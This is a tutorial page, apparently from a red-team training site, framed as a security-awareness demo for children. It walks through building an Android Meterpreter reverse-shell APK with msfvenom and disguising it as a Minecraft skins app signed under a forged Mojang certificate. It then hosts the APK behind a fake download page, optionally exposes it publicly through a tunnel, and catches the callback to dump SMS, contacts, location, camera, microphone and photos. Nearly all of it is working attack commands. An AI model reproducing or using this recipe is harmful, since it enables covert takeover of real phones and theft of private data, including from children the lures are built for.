---
layout: training-page
title: "Link-Click Demo: Android Reverse Shell — Red Team Academy"
module: "Mobile Security"
tags:
  - android
  - demo
  - reverse-shell
  - social-engineering
  - msfvenom
  - education
page_key: "mobile-android-link-click-demo"
---
<h1>Link-Click Demo: Android Reverse Shell</h1>
<p>An end-to-end walkthrough you can run on your own hardware to show someone — a child, a classroom, a new hire — exactly what happens when they tap a link and install an APK from outside the Play Store. The goal is not stealth or persistence. The goal is a dramatic, safe, reversible demo: one tap, a "download" notification, an install prompt, and then the attacker's terminal lights up with the phone's camera, contacts, SMS, and file list.</p>

<p><strong>Only run this against a device you own.</strong> Use an old phone, a fresh Android emulator, or a spare handset with a wiped profile. Do not target anyone else's device. Uninstall the demo app the moment the conversation ends.</p>

<h2>Lab Setup</h2>
<p>You need three things: an attacker box on the same Wi-Fi as the phone, a generated APK, and a way to host it behind a clickable link.</p>

<pre><code># Attacker machine — Kali, Parrot, or any Linux with Metasploit
sudo apt install -y metasploit-framework python3

# Find your LAN IP (use this for LHOST below)
ip -4 addr show | grep inet

# Pick an unused high port for the callback
LHOST=192.168.1.50
LPORT=4444</code></pre>

<p>On the Android device, enable <em>Install unknown apps</em> for Chrome (or whichever browser you plan to use). On modern Android this lives under <code>Settings &gt; Apps &gt; Chrome &gt; Install unknown apps</code>. Leaving this off is exactly the safety layer you want to demonstrate — you will toggle it on for the demo, then toggle it back off afterwards so the lesson sticks.</p>

<h2>Step 1 — Generate the Malicious APK</h2>
<p>msfvenom bundles a Meterpreter stager into a valid, signed Android APK. The output is a real installable package — the phone will treat it exactly like any sideloaded app.</p>

<pre><code># Basic reverse_tcp APK
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 LPORT=4444 \
    R &gt; FreeRobux.apk

# Give it a believable name and icon for the demo
# (children recognise app names — pick something they'd actually tap)
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 LPORT=4444 \
    --platform android \
    -o MinecraftSkinsFree.apk</code></pre>

<p>The produced APK is ~10 KB of stager code wrapped in an Android manifest that requests a long list of dangerous permissions: <code>READ_SMS</code>, <code>RECORD_AUDIO</code>, <code>CAMERA</code>, <code>ACCESS_FINE_LOCATION</code>, <code>READ_CONTACTS</code>, <code>WRITE_EXTERNAL_STORAGE</code>. This is the <em>first</em> teachable moment — open the APK in any analyser and show the child the manifest.</p>

<pre><code># Show the permissions the APK will ask for
aapt dump permissions MinecraftSkinsFree.apk

# Or with apktool for a full decomposition
apktool d MinecraftSkinsFree.apk -o unpacked/
cat unpacked/AndroidManifest.xml | grep -i permission</code></pre>

<h2>Step 2 — Sign the APK (Optional but Realistic)</h2>
<p>msfvenom already signs with a debug key, which is enough for sideload install. For a more realistic demo, re-sign with a fake "publisher" name so the install dialog shows a plausible developer string.</p>

<pre><code># Create a throwaway keystore
keytool -genkey -v -keystore demo.keystore \
    -alias demo -keyalg RSA -keysize 2048 -validity 365 \
    -dname "CN=Mojang Studios, OU=Mobile, O=Minecraft, L=Stockholm, C=SE" \
    -storepass demopass -keypass demopass

# Zipalign and sign
zipalign -v 4 MinecraftSkinsFree.apk aligned.apk
apksigner sign --ks demo.keystore --ks-pass pass:demopass \
    --out MinecraftSkinsFree_signed.apk aligned.apk

apksigner verify --print-certs MinecraftSkinsFree_signed.apk</code></pre>

<h2>Step 3 — Host the APK Behind a Clickable Link</h2>
<p>The whole point of the demo is the <em>link</em>. Put the APK behind a URL the child can tap from a text message, a game chat, or a Discord DM. A one-file Python server is enough on the LAN.</p>

<pre><code># Serve the APK from the current directory
mkdir demo-site &amp;&amp; cd demo-site
cp ../MinecraftSkinsFree_signed.apk ./skins.apk

# Write a minimal landing page so the link looks like a real download site
cat &gt; index.html &lt;&lt;'HTML'
&lt;!doctype html&gt;
&lt;html&gt;&lt;head&gt;&lt;meta name="viewport" content="width=device-width,initial-scale=1"&gt;
&lt;title&gt;Free Minecraft Skins&lt;/title&gt;&lt;/head&gt;
&lt;body style="font-family:sans-serif;text-align:center;padding:40px"&gt;
  &lt;h1&gt;Free Skins Pack&lt;/h1&gt;
  &lt;p&gt;1,200+ skins. No ads. Tap below to install.&lt;/p&gt;
  &lt;a href="skins.apk" style="display:inline-block;padding:16px 32px;
      background:#4caf50;color:#fff;text-decoration:none;border-radius:8px;
      font-size:18px"&gt;⬇ Download Skins Pack&lt;/a&gt;
&lt;/body&gt;&lt;/html&gt;
HTML

# Serve it on port 8080
python3 -m http.server 8080</code></pre>

<p>The link you send is now <code>http://192.168.1.50:8080/</code>. On the LAN that is all you need. For a more realistic "I got this in a text message" feel, tunnel it with ngrok or cloudflared — but do not expose this to the real internet for more than a few minutes, and take it down the instant the demo is over.</p>

<pre><code># Temporary public URL for the demo (LAN-only is safer)
ngrok http 8080
# or
cloudflared tunnel --url http://localhost:8080</code></pre>

<h2>Step 4 — Start the Listener</h2>
<p>The APK is a stager — it connects back to you. Metasploit's <code>multi/handler</code> catches the callback and drops you into a Meterpreter session.</p>

<pre><code>msfconsole -q -x "
use exploit/multi/handler;
set payload android/meterpreter/reverse_tcp;
set LHOST 192.168.1.50;
set LPORT 4444;
set ExitOnSession false;
exploit -j
"</code></pre>

<p>Leave the handler running in one terminal. Keep the Python web server running in another. You are ready for the demo.</p>

<h2>Step 5 — The Demo Itself</h2>
<p>Sit with the child. Hand them the phone. Send the link to the phone (SMS, Signal, whatever). Then narrate what happens as they tap through:</p>

<ol>
  <li><strong>The tap.</strong> They tap the link. Chrome opens the landing page. It looks like any free-download site — green button, no ads, believable name.</li>
  <li><strong>The download.</strong> They tap the green button. Android shows "This type of file can harm your device" — pause here. Point it out. Ask them what they would normally do. Then tap <em>Download anyway</em>.</li>
  <li><strong>The install prompt.</strong> They tap the downloaded file. Android asks for permission to install unknown apps. Show them this screen — this is the <em>last</em> line of defence. Grant it.</li>
  <li><strong>The permission list.</strong> The installer shows the full list of permissions the app wants: camera, microphone, SMS, contacts, location, storage. Read them out loud. Ask them why a "skins pack" would need to read SMS. Then tap <em>Install</em>.</li>
  <li><strong>The callback.</strong> As soon as they tap the app icon to open it, your handler terminal lights up:
    <pre><code>[*] Sending stage (76018 bytes) to 192.168.1.77
[*] Meterpreter session 1 opened (192.168.1.50:4444 -&gt; 192.168.1.77:51422)
meterpreter &gt;</code></pre>
  </li>
</ol>

<h2>Step 6 — Show Them What You Can See</h2>
<p>This is the moment that makes the lesson stick. Run these live, in front of them, with their phone sitting on the table:</p>

<pre><code># Who and where they are
sysinfo
getuid
geolocate

# Read their contacts
dump_contacts

# Read their SMS
dump_sms

# Snap a picture with the front camera
webcam_list
webcam_snap -i 1

# Record 10 seconds of microphone audio
record_mic -d 10

# Take a screenshot of whatever is on screen
screenshot

# List photos on the device
ls /sdcard/DCIM/Camera

# Download a photo
download /sdcard/DCIM/Camera/IMG_20240101.jpg ./stolen.jpg</code></pre>

<p>Show them the webcam snap. Show them the screenshot. Show them the SMS dump. The abstract idea of "a hacker can see your phone" becomes very concrete when they watch you pull their own selfie off the device you are holding.</p>

<h2>Step 7 — Clean Up (Do Not Skip This)</h2>
<p>The demo is only educational if the phone is safe again at the end. Walk through the cleanup together so they see how to recover:</p>

<pre><code># In Meterpreter — drop the session
meterpreter &gt; exit

# On the phone
# Settings &gt; Apps &gt; MinecraftSkinsFree &gt; Uninstall
# Settings &gt; Apps &gt; Chrome &gt; Install unknown apps &gt; OFF

# On the attacker box — kill the listener and the web server
# Ctrl+C in both terminals

# Delete the APK and the landing page
rm -rf demo-site MinecraftSkinsFree*.apk aligned.apk demo.keystore</code></pre>

<p>If you used ngrok or cloudflared, tear down the tunnel immediately. The public URL should live for minutes, not hours.</p>

<h2>Talking Points</h2>
<p>The technical steps are the scaffolding. The conversation is the lesson. A few prompts that work well:</p>

<ul>
  <li><strong>"Would you have clicked the link?"</strong> — establish the social engineering hook. The link looked safe because it looked familiar.</li>
  <li><strong>"How many warnings did Android give us?"</strong> — count them: unknown-file warning, install-unknown-apps prompt, permissions list. Three safety doors. We walked through all of them.</li>
  <li><strong>"Which permission should have been the red flag?"</strong> — a skins pack needs none of camera, mic, SMS, contacts. Permission lists are worth reading.</li>
  <li><strong>"What would happen if I weren't sitting next to you?"</strong> — the attacker would keep the session open, steal data quietly, and the phone would look completely normal.</li>
  <li><strong>"What should you do if you ever see the install-unknown-apps screen?"</strong> — back out. Always. No free game is worth it.</li>
</ul>

<h2>Variations for Different Ages</h2>
<ul>
  <li><strong>Younger kids (6–9):</strong> skip the permission manifest part. Focus on the three warning screens and the moment you take a webcam snap. The visual punchline is enough.</li>
  <li><strong>Tweens (10–13):</strong> add the <code>aapt dump permissions</code> step. Let them read the permission list themselves. Discuss which ones a real skins pack might legitimately need.</li>
  <li><strong>Teens (14+):</strong> show the full Meterpreter post-exploitation module list. Talk about persistence, data exfiltration, and why antivirus on Android is not a substitute for being careful with links.</li>
</ul>

<h2>Why This Demo Works</h2>
<p>Lectures about "don't click suspicious links" slide off. Watching your own phone get hollowed out in real time does not. The same principle underlies every serious security awareness program: you do not teach threat models, you <em>show</em> them. The cost of the demo is an old Android phone and an hour of your time. The benefit is a child who understands, at a gut level, what an install prompt actually means.</p>

<h2>Resources</h2>
<ul>
  <li>msfvenom Android module — <code>github.com/rapid7/metasploit-framework</code></li>
  <li>Android Meterpreter source — <code>github.com/rapid7/metasploit-payloads/tree/master/java/androidpayload</code></li>
  <li>apktool — <code>github.com/iBotPeaches/Apktool</code></li>
  <li>apksigner (Android SDK build-tools) — <code>developer.android.com/tools/apksigner</code></li>
  <li>Android permissions reference — <code>developer.android.com/reference/android/Manifest.permission</code></li>
  <li>Related pages on this site: <a href="/mobile/android-payload-dev/">Android Payload Development</a>, <a href="/mobile/android-post-exploitation/">Android Post-Exploitation</a>, <a href="/mobile/apk-analysis/">APK Static Analysis</a></li>
</ul>
